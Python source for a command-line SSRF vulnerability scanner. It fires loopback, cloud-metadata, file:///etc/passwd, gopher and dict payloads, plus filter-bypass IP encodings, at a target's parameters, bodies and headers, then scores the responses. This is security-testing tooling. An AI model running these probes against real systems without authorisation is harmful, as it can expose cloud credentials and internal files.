#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Surface Discovery Scanner
Tests for SSRF vulnerabilities across multiple attack vectors
"""

import requests
import sys
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import time

class SSRFScanner:
    def __init__(self, target_url, callback_url=None):
        self.target_url = target_url
        self.callback_url = callback_url or "http://example.com"
        self.parsed_url = urlparse(target_url)
        self.vulnerabilities = []
        
    def test_url_parameters(self):
        """Test URL parameters for SSRF"""
        # Common parameter names that might fetch URLs
        url_params = [
            'url', 'uri', 'path', 'dest', 'destination', 'redirect', 
            'link', 'next', 'target', 'rurl', 'file', 'document',
            'folder', 'root', 'page', 'feed', 'host', 'port', 'to',
            'out', 'view', 'dir', 'download', 'pdf', 'src', 'source'
        ]
        
        ssrf_payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://169.254.169.254',  # AWS metadata
            'http://metadata.google.internal',  # GCP metadata
            'http://169.254.169.254/latest/meta-data/',
            'file:///etc/passwd',
            'http://0.0.0.0',
            'http://[::1]',
            'http://2130706433',  # Decimal IP for 127.0.0.1
            self.callback_url
        ]
        
        for param in url_params:
            for payload in ssrf_payloads:
                try:
                    # Test in query parameters
                    test_url = f"{self.target_url}{'&' if '?' in self.target_url else '?'}{param}={payload}"
                    
                    start_time = time.time()
                    r = requests.get(test_url, timeout=10, allow_redirects=False)
                    response_time = time.time() - start_time
                    
                    # Check for SSRF indicators
                    if self._check_ssrf_indicators(r, payload, response_time):
                        self.vulnerabilities.append({
                            'severity': self._get_severity(payload),
                            'type': 'URL Parameter SSRF',
                            'parameter': param,
                            'payload': payload,
                            'method': 'GET',
                            'url': test_url,
                            'status_code': r.status_code,
                            'response_time': f"{response_time:.2f}s"
                        })
                except Exception as e:
                    pass
    
    def test_post_body(self):
        """Test POST body parameters for SSRF"""
        url_params = ['url', 'uri', 'link', 'target', 'file', 'document', 'path']
        
        ssrf_payloads = [
            'http://127.0.0.1',
            'http://localhost:80',
            'http://169.254.169.254',
            self.callback_url
        ]
        
        for param in url_params:
            for payload in ssrf_payloads:
                try:
                    data = {param: payload}
                    start_time = time.time()
                    r = requests.post(self.target_url, data=data, timeout=10, allow_redirects=False)
                    response_time = time.time() - start_time
                    
                    if self._check_ssrf_indicators(r, payload, response_time):
                        self.vulnerabilities.append({
                            'severity': self._get_severity(payload),
                            'type': 'POST Body SSRF',
                            'parameter': param,
                            'payload': payload,
                            'method': 'POST',
                            'status_code': r.status_code,
                            'response_time': f"{response_time:.2f}s"
                        })
                except Exception as e:
                    pass
    
    def test_json_body(self):
        """Test JSON body for SSRF"""
        url_fields = ['url', 'uri', 'link', 'webhook', 'callback', 'endpoint']
        
        ssrf_payloads = [
            'http://127.0.0.1:80',
            'http://localhost',
            'http://169.254.169.254/latest/meta-data/',
            self.callback_url
        ]
        
        for field in url_fields:
            for payload in ssrf_payloads:
                try:
                    json_data = {field: payload}
                    headers = {'Content-Type': 'application/json'}
                    
                    start_time = time.time()
                    r = requests.post(self.target_url, json=json_data, headers=headers, 
                                     timeout=10, allow_redirects=False)
                    response_time = time.time() - start_time
                    
                    if self._check_ssrf_indicators(r, payload, response_time):
                        self.vulnerabilities.append({
                            'severity': self._get_severity(payload),
                            'type': 'JSON Body SSRF',
                            'field': field,
                            'payload': payload,
                            'method': 'POST',
                            'content_type': 'application/json',
                            'status_code': r.status_code,
                            'response_time': f"{response_time:.2f}s"
                        })
                except Exception as e:
                    pass
    
    def test_headers(self):
        """Test various headers for SSRF"""
        header_names = [
            'Referer', 'X-Forwarded-For', 'X-Forwarded-Host',
            'X-Original-URL', 'X-Rewrite-URL', 'Client-IP',
            'True-Client-IP', 'Cluster-Client-IP', 'Via',
            'Forwarded', 'X-Custom-IP-Authorization'
        ]
        
        ssrf_payloads = [
            'http://127.0.0.1',
            'http://169.254.169.254',
            self.callback_url
        ]
        
        for header in header_names:
            for payload in ssrf_payloads:
                try:
                    headers = {header: payload}
                    start_time = time.time()
                    r = requests.get(self.target_url, headers=headers, timeout=10)
                    response_time = time.time() - start_time
                    
                    if self._check_ssrf_indicators(r, payload, response_time):
                        self.vulnerabilities.append({
                            'severity': 'MEDIUM',
                            'type': 'Header SSRF',
                            'header': header,
                            'payload': payload,
                            'status_code': r.status_code,
                            'response_time': f"{response_time:.2f}s"
                        })
                except Exception as e:
                    pass
    
    def test_cloud_metadata(self):
        """Test for cloud metadata service access"""
        metadata_endpoints = [
            ('AWS', 'http://169.254.169.254/latest/meta-data/'),
            ('AWS', 'http://169.254.169.254/latest/user-data/'),
            ('AWS', 'http://169.254.169.254/latest/dynamic/instance-identity/document'),
            ('GCP', 'http://metadata.google.internal/computeMetadata/v1/'),
            ('GCP', 'http://metadata/computeMetadata/v1/'),
            ('Azure', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'),
            ('DigitalOcean', 'http://169.254.169.254/metadata/v1/'),
        ]
        
        for cloud_provider, endpoint in metadata_endpoints:
            try:
                test_url = f"{self.target_url}{'&' if '?' in self.target_url else '?'}url={endpoint}"
                r = requests.get(test_url, timeout=10)
                
                # Check for cloud-specific responses
                if self._check_cloud_metadata(r, cloud_provider):
                    self.vulnerabilities.append({
                        'severity': 'CRITICAL',
                        'type': 'Cloud Metadata SSRF',
                        'cloud_provider': cloud_provider,
                        'payload': endpoint,
                        'description': f'Possible access to {cloud_provider} metadata service',
                        'status_code': r.status_code
                    })
            except Exception as e:
                pass
    
    def test_protocol_handlers(self):
        """Test various protocol handlers"""
        protocols = [
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'dict://127.0.0.1:11211/stats',
            'gopher://127.0.0.1:80/',
            'ldap://127.0.0.1:389',
            'ftp://127.0.0.1',
            'tftp://127.0.0.1:69'
        ]
        
        for protocol in protocols:
            try:
                test_url = f"{self.target_url}{'&' if '?' in self.target_url else '?'}url={protocol}"
                start_time = time.time()
                r = requests.get(test_url, timeout=10)
                response_time = time.time() - start_time
                
                if self._check_protocol_response(r, protocol):
                    self.vulnerabilities.append({
                        'severity': 'HIGH',
                        'type': 'Protocol Handler SSRF',
                        'payload': protocol,
                        'protocol': protocol.split(':')[0],
                        'status_code': r.status_code,
                        'response_time': f"{response_time:.2f}s"
                    })
            except Exception as e:
                pass
    
    def test_bypass_techniques(self):
        """Test SSRF bypass techniques"""
        target_base = "127.0.0.1"
        bypass_payloads = [
            f'http://{target_base}',
            f'http://0.0.0.0',
            f'http://localhost',
            f'http://127.1',
            f'http://127.0.1',
            f'http://2130706433',  # Decimal
            f'http://0x7f000001',  # Hex
            f'http://017700000001',  # Octal
            f'http://[::1]',  # IPv6
            f'http://127.0.0.1.nip.io',
            f'http://127.0.0.1.xip.io',
            f'http://spoofed.burpcollaborator.net',
            f'http://127.0.0.1#.example.com',
            f'http://example.com@127.0.0.1',
        ]
        
        for payload in bypass_payloads:
            try:
                test_url = f"{self.target_url}{'&' if '?' in self.target_url else '?'}url={payload}"
                start_time = time.time()
                r = requests.get(test_url, timeout=10)
                response_time = time.time() - start_time
                
                if self._check_ssrf_indicators(r, payload, response_time):
                    self.vulnerabilities.append({
                        'severity': 'HIGH',
                        'type': 'SSRF Filter Bypass',
                        'payload': payload,
                        'technique': self._identify_bypass_technique(payload),
                        'status_code': r.status_code,
                        'response_time': f"{response_time:.2f}s"
                    })
            except Exception as e:
                pass
    
    def _check_ssrf_indicators(self, response, payload, response_time):
        """Check response for SSRF indicators"""
        indicators = []
        
        # Check status code
        if response.status_code in [200, 301, 302]:
            indicators.append('valid_status')
        
        # Check response time (localhost should be faster)
        if 'localhost' in payload or '127.0.0.1' in payload:
            if response_time < 1.0:
                indicators.append('fast_response')
        
        # Check for internal content markers
        internal_markers = [
            'root:', 'localhost', 'internal', 'private',
            'admin', 'intranet', 'local.', 'corp.',
            '[fonts]', 'for 16-bit app support'  # Windows ini file
        ]
        
        for marker in internal_markers:
            if marker.lower() in response.text.lower():
                indicators.append('internal_content')
                break
        
        # Check content length difference
        if len(response.content) > 100:
            indicators.append('substantial_content')
        
        return len(indicators) >= 2
    
    def _check_cloud_metadata(self, response, provider):
        """Check for cloud metadata service responses"""
        cloud_indicators = {
            'AWS': ['ami-id', 'instance-id', 'placement', 'security-groups'],
            'GCP': ['computeMetadata', 'project', 'instance'],
            'Azure': ['compute', 'vmId', 'subscriptionId'],
            'DigitalOcean': ['droplet_id', 'hostname', 'region']
        }
        
        indicators = cloud_indicators.get(provider, [])
        return any(ind in response.text for ind in indicators)
    
    def _check_protocol_response(self, response, protocol):
        """Check if protocol handler worked"""
        protocol_indicators = {
            'file': ['root:', '[fonts]', 'windows'],
            'dict': ['STAT', 'memcached'],
            'gopher': ['HTTP/', 'Server:'],
            'ldap': ['ldap', 'directory'],
        }
        
        proto = protocol.split(':')[0]
        indicators = protocol_indicators.get(proto, [])
        return any(ind in response.text for ind in indicators)
    
    def _identify_bypass_technique(self, payload):
        """Identify bypass technique used"""
        if re.search(r'\d{10}', payload):
            return 'Decimal IP encoding'
        elif '0x' in payload:
            return 'Hexadecimal encoding'
        elif re.search(r'0\d{9}', payload):
            return 'Octal encoding'
        elif '::1' in payload:
            return 'IPv6 localhost'
        elif 'nip.io' in payload or 'xip.io' in payload:
            return 'DNS rebinding service'
        elif '@' in payload:
            return 'URL authentication bypass'
        elif '#' in payload:
            return 'Fragment bypass'
        else:
            return 'Alternative representation'
    
    def _get_severity(self, payload):
        """Determine severity based on payload"""
        if '169.254.169.254' in payload or 'metadata' in payload:
            return 'CRITICAL'
        elif 'file://' in payload:
            return 'HIGH'
        elif '127.0.0.1' in payload or 'localhost' in payload:
            return 'HIGH'
        else:
            return 'MEDIUM'
    
    def scan_all(self):
        """Run all SSRF detection tests"""
        print(f"\n[*] Scanning for SSRF vulnerabilities: {self.target_url}\n")
        
        print("[*] Testing URL parameters...")
        self.test_url_parameters()
        
        print("[*] Testing POST body...")
        self.test_post_body()
        
        print("[*] Testing JSON body...")
        self.test_json_body()
        
        print("[*] Testing headers...")
        self.test_headers()
        
        print("[*] Testing cloud metadata access...")
        self.test_cloud_metadata()
        
        print("[*] Testing protocol handlers...")
        self.test_protocol_handlers()
        
        print("[*] Testing bypass techniques...")
        self.test_bypass_techniques()
        
        return self.vulnerabilities
    
    def print_report(self):
        """Print formatted vulnerability report"""
        if not self.vulnerabilities:
            print("\n[+] No SSRF vulnerabilities detected!")
            return
        
        print(f"\n[!] Found {len(self.vulnerabilities)} potential SSRF vulnerability(ies):\n")
        
        for i, vuln in enumerate(self.vulnerabilities, 1):
            print(f"[{i}] {vuln['type']} [{vuln['severity']}]")
            for key, value in vuln.items():
                if key not in ['type', 'severity']:
                    print(f"    {key}: {value}")
            print()

def main():
    if len(sys.argv) < 2:
        print("Usage: python ssrf_scanner.py <target_url> [callback_url]")
        print("Example: python ssrf_scanner.py https://example.com/api/fetch")
        print("         python ssrf_scanner.py https://example.com?url=test http://your-server.com")
        sys.exit(1)
    
    target = sys.argv[1]
    callback = sys.argv[2] if len(sys.argv) > 2 else None
    
    # Validate URL format
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    scanner = SSRFScanner(target, callback)
    scanner.scan_all()
    scanner.print_report()

if __name__ == "__main__":
    main()